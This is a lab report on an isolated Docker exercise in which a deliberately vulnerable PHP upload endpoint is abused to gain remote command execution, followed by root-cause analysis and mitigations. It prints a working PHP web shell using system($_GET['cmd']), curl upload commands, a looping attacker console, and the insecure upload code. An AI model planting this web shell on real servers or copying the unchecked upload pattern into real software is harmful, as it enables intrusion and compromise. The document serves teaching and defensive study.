

# SecureVault – Unrestricted File Upload to Remote Code Execution (RCE)
## Full Technical Project Report

### 1. Project Title

**SecureVault: Demonstration of Unrestricted File Upload Leading to Remote Code Execution in an Isolated Docker Environment**

---

## 2. Abstract

This project demonstrates a controlled web-application security vulnerability in a custom PHP application named **SecureVault**.

The objective was to create an isolated Docker environment containing a vulnerable PHP/Apache server and an attacker container. The application contains a file-upload functionality that does not properly restrict uploaded file types and stores uploaded files inside the web-accessible directory.

Because PHP files can be uploaded into the web root and Apache is configured to process `.php` files, an uploaded PHP file can subsequently be requested through HTTP and executed by the server.

The project progressed through the following stages:

```text
Unrestricted File Upload
        ↓
PHP File Upload
        ↓
PHP Server-Side Execution
        ↓
OS Command Execution
        ↓
Attacker-Controlled RCE Demonstration
```

The demonstration was performed entirely inside a private Docker network. The attacker container communicated with the SecureVault server container using the Docker service name `server`.

---

# 3. Objectives

The main objectives of the project were:

1. Build a controlled Docker-based security lab.
2. Deploy a PHP/Apache SecureVault server.
3. Create an attacker container.
4. Establish communication between attacker and server.
5. Implement a file-upload endpoint.
6. Demonstrate unrestricted file upload.
7. Demonstrate that `.php` files can be uploaded.
8. Demonstrate server-side PHP execution.
9. Demonstrate OS command execution through PHP.
10. Determine the privilege context in which the commands execute.
11. Create an attacker-side RCE console for repeated command execution.
12. Analyze the security impact.
13. Identify appropriate mitigation techniques.

---

# 4. Scope

The experiment was performed in an isolated Docker environment.

### Components

```text
+-------------------------+
|        Attacker         |
|    Docker Container     |
|                         |
| curl / test scripts     |
+------------+------------+
             |
             | HTTP
             |
             v
+-------------------------+
|      SecureVault        |
|      Docker Server      |
|                         |
| Apache 2.4              |
| PHP 8.2                 |
| File Upload API         |
+-------------------------+
```

The containers communicate through:

```text
rce-file-upload-lab_rce-lab-network
```

The server was exposed to the host through:

```text
localhost:8081
```

---

# 5. Technology Stack

| Technology | Purpose |
|---|---|
| Docker | Containerized security lab |
| Docker Compose | Multi-container orchestration |
| Ubuntu/WSL environment | Development environment |
| Apache 2.4 | Web server |
| PHP 8.2 | Server-side application |
| cURL | HTTP testing |
| Docker bridge network | Private communication |
| Windows PowerShell | Host-side administration |

---

# 6. Lab Architecture

The final architecture consisted primarily of three containers:

```text
                 Docker Host
                     |
          rce-file-upload-lab
                     |
        +------------+------------+
        |            |            |
        v            v            v
     Attacker      Client       Server
        |                         |
        |       HTTP              |
        +------------------------>|
                                  |
                            Apache + PHP
                                  |
                              /var/www/html
                                  |
                              /uploads
```

The attacker container was able to resolve:

```text
server
```

through Docker's internal DNS.

Therefore, the attacker could communicate with the server using:

```text
http://server/...
```

without using the host's `localhost:8081` address.

---

# 7. Server Configuration

The server was based on:

```dockerfile
FROM php:8.2-apache
```

The application document root was:

```text
/var/www/html
```

The upload directory was:

```text
/var/www/html/uploads
```

The directory was deliberately placed inside the web root for the vulnerable demonstration.

The server was configured with:

```text
Apache
   ↓
PHP 8.2
   ↓
/var/www/html
```

The host exposed the application through:

```text
8081:80
```

Therefore, from the host:

```text
http://localhost:8081
```

accessed the SecureVault application.

---

# 8. SecureVault Application

The application contained several PHP components, including:

```text
index.php
login.php
dashboard.php
upload.php
status.php
api/upload.php
```

The application included login functionality.

The test credentials used during the controlled application demonstration were:

```text
Username: user
Password: password123
```

The dashboard was protected by a PHP session.

---

# 9. Initial Authentication Testing

Initially, direct access to the dashboard without authentication resulted in a redirect.

The application therefore had an authentication mechanism for the normal dashboard workflow.

However, the vulnerable upload API was separately accessible.

The upload endpoint was:

```text
/api/upload.php
```

The important finding was that the API did not enforce the same authentication requirement.

---

# 10. Vulnerable Upload Endpoint

The vulnerable upload endpoint contained logic similar to:

```php
$uploadDir = "/var/www/html/uploads/";

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    exit("Method not allowed.");
}

if (!isset($_FILES["file"])) {
    http_response_code(400);
    exit("No file was uploaded.");
}
```

The uploaded file was then saved.

The important vulnerable behavior was:

```text
No authentication check
        +
No PHP extension restriction
        +
Upload inside web root
        +
Apache executes PHP
```

This combination created the vulnerability.

---

# 11. Vulnerability Description

The primary vulnerability was:

> **Unrestricted File Upload**

The application accepted files without enforcing a strict allowlist of safe extensions.

For example, a normal file such as:

```text
test.txt
```

could be uploaded.

More importantly, a file such as:

```text
proof.php
```

could also be uploaded.

The server stored the uploaded file in:

```text
/var/www/html/uploads/
```

Since this directory was under the Apache document root, it was accessible through HTTP.

---

# 12. First Upload Test

The attacker container created a test file:

```sh
printf '%s\n' 'CONTROLLED_UPLOAD_TEST_2' > /tmp/test.txt
```

The file was then uploaded:

```sh
curl -i -F 'file=@/tmp/test.txt' http://server/api/upload.php
```

The application returned a JSON response similar to:

```json
{
    "status": "success",
    "original_name": "test.txt",
    "stored_name": "api_upload_6ab9107ad97666.53477731.txt"
}
```

This confirmed that the attacker container could upload files without authentication.

---

# 13. PHP Upload Test

A PHP file was then created.

The initial proof was:

```php
<?php
echo "SECUREVAULT_UNAUTHENTICATED_PHP_EXECUTION_PROOF";
?>
```

It was uploaded through the same API.

The application generated a filename such as:

```text
api_upload_6ab911896a6125.16845296.php
```

The file was then requested through HTTP:

```text
/uploads/api_upload_6ab911896a6125.16845296.php
```

The server responded with:

```text
SECUREVAULT_UNAUTHENTICATED_PHP_EXECUTION_PROOF
```

The HTTP response also contained:

```text
X-Powered-By: PHP/8.2.34
```

This established that the uploaded `.php` file was not being treated as a static file.

It was being **interpreted and executed by PHP**.

---

# 14. PHP Execution Verification

The important chain demonstrated was:

```text
Attacker
   |
   | POST multipart/form-data
   v
/api/upload.php
   |
   | stores proof.php
   v
/uploads/proof.php
   |
   | HTTP GET
   v
Apache
   |
   v
PHP interpreter
   |
   v
PHP code execution
```

This was the key transition from:

```text
File Upload
```

to:

```text
Server-Side Code Execution
```

---

# 15. OS Command Execution

The PHP proof was subsequently modified to accept a command parameter.

The proof PHP was:

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "SecureVault RCE proof";
}
?>
```

The important statement was:

```php
system($_GET['cmd']);
```

This causes the PHP process to pass the supplied command to the operating system.

For example:

```text
?cmd=hostname
```

causes PHP to execute:

```text
hostname
```

on the server.

---

# 16. RCE Request Flow

The request flow became:

```text
Attacker Container
       |
       | GET /uploads/proof.php?cmd=hostname
       v
Apache
       |
       v
PHP
       |
       | $_GET["cmd"]
       v
system("hostname")
       |
       v
Server OS
       |
       v
Command Output
       |
       v
HTTP Response
       |
       v
Attacker
```

This is the central RCE demonstration.

---

# 17. RCE Testing

Several harmless server commands were tested.

### Hostname

```text
hostname
```

This returned the server container hostname.

### Current directory

```text
pwd
```

The result was:

```text
/var/www/html
```

### Current user

```text
whoami
```

The result was:

```text
www-data
```

### Operating system information

```text
uname -a
```

returned Linux kernel/system information.

### Directory listing

```text
ls -la
```

returned the contents of the server directory.

---

# 18. Important Privilege Finding

One of the important observations was:

```text
whoami
```

returned:

```text
www-data
```

rather than:

```text
root
```

This is expected because Apache worker processes were running under the `www-data` account.

The process inspection showed a structure similar to:

```text
root       apache2 -DFOREGROUND
www-data   apache2 -DFOREGROUND
www-data   apache2 -DFOREGROUND
```

Therefore:

```text
Apache master process
        ↓
       root

Apache worker
        ↓
      www-data

PHP execution
        ↓
      www-data
```

This demonstrates an important security principle:

> RCE does not automatically mean root privileges.

The commands execute with the privileges available to the PHP/Apache worker.

---

# 19. Controlled Secret Demonstration

A lab-only web-readable secret was created:

```text
/var/www/html/lab-secret.txt
```

Its content was:

```text
SECUREVAULT_WEBAPP_SECRET=LAB-ONLY-ACCESS-9281
```

A PHP proof file was used to read this controlled file.

The resulting response was:

```text
SECUREVAULT_WEBAPP_SECRET=LAB-ONLY-ACCESS-9281
```

This demonstrated controlled application-level impact without using real credentials or sensitive host information.

---

# 20. Attacker Container Testing

The attacker container was able to communicate directly with the server:

```sh
curl -i http://server/login.php
```

The response returned the SecureVault login page.

This confirmed:

```text
Attacker container
        |
        | Docker network
        v
Server container
```

was functioning correctly.

---

# 21. Attacker-Side RCE Console

To avoid manually entering a separate `curl` command for every command, an attacker-side shell loop was developed.

The console was:

```sh
while true; do
    printf "server-rce$ "
    read cmd

    [ "$cmd" = "exit" ] && break
    [ -z "$cmd" ] && continue

    curl -s --get \
      --data-urlencode "cmd=$cmd" \
      "http://server/uploads/<stored-proof-file>.php"

    echo
done
```

This provided an interface such as:

```text
server-rce$ hostname
c1b460735f45

server-rce$ pwd
/var/www/html

server-rce$ whoami
www-data

server-rce$ ls -la
...
```

---

# 22. How the RCE Console Works

The console does not create a separate shell on the server.

Instead, every command is converted into an HTTP request.

For example:

```text
server-rce$ hostname
```

becomes conceptually:

```text
GET /uploads/proof.php?cmd=hostname
```

PHP receives:

```php
$_GET["cmd"]
```

and executes:

```php
system("hostname");
```

The result is returned to the attacker.

Therefore the console is:

```text
Attacker terminal
       |
       | curl
       v
HTTP request
       |
       v
PHP web shell
       |
       v
system()
       |
       v
Server OS
       |
       v
HTTP response
       |
       v
Attacker terminal
```

---

# 23. Filename Handling Issue Encountered

During testing, a 404 error occurred:

```text
HTTP/1.1 404 Not Found
```

The requested file was:

```text
api_upload_6aba503ec26330.61105264.php
```

The problem was that the uploaded filename was generated dynamically.

The upload API used:

```php
$newName = uniqid("api_upload_", true) . "." . strtolower($extension);
```

Therefore every upload generated a new filename.

For example:

```text
proof.php
   ↓
api_upload_6aba0b07bd0b62.73111751.php
```

and a later upload could become:

```text
api_upload_6aba503ec26330.61105264.php
```

If an old filename is used after a new upload, Apache returns:

```text
404 Not Found
```

The correct approach is to use the `stored_name` returned by the most recent upload response.

---

# 24. Shell Input Issue Encountered

During one test, the terminal displayed:

```text
>
>
>
>
```

This occurred because the multiline shell command had been entered incorrectly, causing the shell to wait for additional input.

The command could be cancelled using:

```text
Ctrl+C
```

and then entered again correctly.

---

# 25. Difference Between Docker Shell and RCE

An important distinction was identified during the project.

Running:

```powershell
docker compose exec server sh
```

provides:

```text
root
```

because Docker is giving the administrator a shell inside the container.

That is **not RCE**.

The RCE demonstration is:

```text
Attacker container
       ↓
HTTP request
       ↓
uploaded PHP
       ↓
system()
       ↓
www-data
       ↓
server command
```

Therefore:

```text
docker compose exec server sh
```

= container administration.

Whereas:

```text
curl http://server/uploads/proof.php?cmd=whoami
```

= application-level remote command execution.

---

# 26. Reverse Shell Investigation

The project also investigated the difference between RCE and an interactive remote shell.

The desired conceptual progression was:

```text
File Upload
     ↓
PHP Execution
     ↓
RCE
     ↓
Interactive Shell
```

The project established the first three stages.

A reverse shell would represent a separate stage where the server-side process establishes a persistent connection to the attacker.

This was not implemented in the final demonstration.

Therefore the project should accurately describe the result as:

> **Unauthenticated unrestricted file upload leading to PHP execution and OS command execution (RCE).**

It should not claim that a persistent reverse shell was successfully established.

---

# 27. Security Impact

The demonstrated vulnerability has several potential security consequences.

### 27.1 Unauthorized file upload

An unauthenticated client was able to upload files.

### 27.2 Server-side code execution

An uploaded PHP file was interpreted by Apache/PHP.

### 27.3 OS command execution

The PHP file was able to invoke operating-system commands.

### 27.4 Application-level data access

The controlled lab secret was successfully accessed through PHP execution.

### 27.5 Potential further compromise

If an application process has access to sensitive files, credentials, internal services, or other resources, server-side command execution can potentially expose those resources.

The actual impact depends on the permissions of the web-server process and the surrounding system configuration.

---

# 28. Root Cause

The vulnerability resulted from several unsafe design decisions occurring together:

```text
No authentication on upload endpoint
             +
No strict extension allowlist
             +
PHP files accepted
             +
Uploads stored under web root
             +
PHP execution enabled
             +
Web process has filesystem permissions
```

Individually, some of these configurations may not immediately produce RCE.

Together, they created a direct path from file upload to server-side code execution.

---

# 29. Recommended Mitigations

## 29.1 Require Authentication

The upload endpoint should require authentication and authorization.

For example:

```text
Unauthenticated request
        ↓
      Reject
        ↓
HTTP 401/403
```

---

## 29.2 Use an Extension Allowlist

Do not accept arbitrary extensions.

For example, if the application only needs images:

```text
.jpg
.jpeg
.png
```

should be accepted.

PHP extensions such as:

```text
.php
.php3
.php4
.php5
.phtml
```

should not be accepted.

---

## 29.3 Validate MIME Type

Do not rely only on the filename.

The server should inspect the uploaded file content and verify that it matches the expected type.

---

## 29.4 Store Uploads Outside the Web Root

Instead of:

```text
/var/www/html/uploads
```

use a directory that Apache cannot directly serve.

For example:

```text
/var/lib/securevault/uploads
```

Then users access files through a controlled download endpoint.

---

## 29.5 Disable Script Execution in Upload Directory

Even if an attacker manages to upload a PHP file, Apache should not execute scripts in the upload directory.

This provides defense in depth.

---

## 29.6 Rename Uploaded Files

The server should generate random internal filenames rather than trusting the original filename.

Your application already partially implemented this through:

```php
uniqid("api_upload_", true)
```

but filename randomization alone does not prevent PHP execution.

---

## 29.7 Least Privilege

The web server should run with the minimum privileges required.

Your experiment demonstrated the value of this because PHP commands executed as:

```text
www-data
```

rather than root.

---

## 29.8 Logging and Monitoring

The application should log:

- upload attempts
- user identity
- source IP
- filename
- MIME type
- upload result
- unusual PHP requests
- suspicious query parameters

For example:

```text
GET /uploads/*.php?cmd=...
```

should be considered highly suspicious in an application where PHP uploads are not expected.

---

# 30. Secure Architecture After Mitigation

A safer architecture would be:

```text
                 Attacker
                    |
                    v
             Authentication
                    |
                    v
             Upload Endpoint
                    |
                    v
          File Type Validation
                    |
                    v
             Rename File
                    |
                    v
       Storage Outside Web Root
                    |
                    v
          Controlled Download
```

The critical difference is:

```text
Uploaded file
      X
      |
      X → PHP execution
```

Instead:

```text
Uploaded file
      ↓
Non-executable storage
```

---

# 31. Testing Results

| Test | Expected Result | Observed Result |
|---|---|---|
| Access login page | HTTP 200 | Successful |
| Direct dashboard without login | Redirect | Successful |
| Attacker → server connectivity | HTTP response | Successful |
| Upload TXT file | Upload accepted | Successful |
| Upload PHP file | PHP file stored | Successful |
| Request uploaded PHP | PHP executes | Successful |
| `whoami` | Server process user | `www-data` |
| `hostname` | Server hostname | Container hostname |
| `pwd` | Server working directory | `/var/www/html` |
| `uname -a` | Server OS information | Successful |
| `ls -la` | Server directory listing | Successful |
| Controlled secret proof | Lab secret returned | Successful |
| Old uploaded filename | 404 | Expected |
| Docker server shell | Container shell | Successful |
| Persistent reverse shell | Not implemented | Not part of final demonstration |

---

# 32. Final Attack Chain

The final demonstrated attack chain is:

```text
                ATTACKER
                    |
                    |
              HTTP POST Upload
                    |
                    v
          +--------------------+
          | /api/upload.php    |
          |                    |
          | No auth            |
          | No PHP restriction |
          +---------+----------+
                    |
                    v
          /var/www/html/uploads
                    |
                    |
             Uploaded PHP
                    |
                    v
          Apache + PHP 8.2
                    |
                    v
             PHP execution
                    |
                    v
             system($_GET[])
                    |
                    v
            OS command execution
                    |
                    v
              www-data
                    |
                    v
             Command output
                    |
                    v
                ATTACKER
```

---

# 33. Key Findings

The project successfully demonstrated:

### Finding 1 — Unauthenticated upload

The attacker container was able to access the upload API without normal application authentication.

### Finding 2 — Arbitrary PHP upload

The application accepted a `.php` file.

### Finding 3 — PHP execution

The uploaded PHP file was interpreted by Apache/PHP.

### Finding 4 — Remote command execution

The PHP `system()` function allowed attacker-controlled input to reach the operating system.

### Finding 5 — Web-process privilege

The commands executed as:

```text
www-data
```

rather than root.

### Finding 6 — Controlled impact

The RCE was able to access a deliberately created lab-only application secret.

---

# 34. Conclusion

The SecureVault project successfully demonstrated a serious web-application security weakness caused by an unrestricted file-upload implementation.

The most important result was the transition:

```text
Unrestricted File Upload
            ↓
      Upload PHP File
            ↓
       PHP Execution
            ↓
    OS Command Execution
            ↓
           RCE
```

The attacker container was able to communicate with the SecureVault server through the private Docker network and cause commands to execute within the server's PHP/Apache context.

The experiment also demonstrated that the resulting execution context was `www-data`, highlighting the importance of least privilege.

The primary remediation is to prevent executable files from being uploaded and executed. This should be implemented through multiple layers: authentication, strict file-type validation, storage outside the web root, disabling script execution in upload directories, least-privilege permissions, and security monitoring.

Overall, the lab provides a controlled demonstration of how a seemingly simple file-upload weakness can escalate into **server-side code execution and OS-level command execution** when multiple insecure configurations are combined.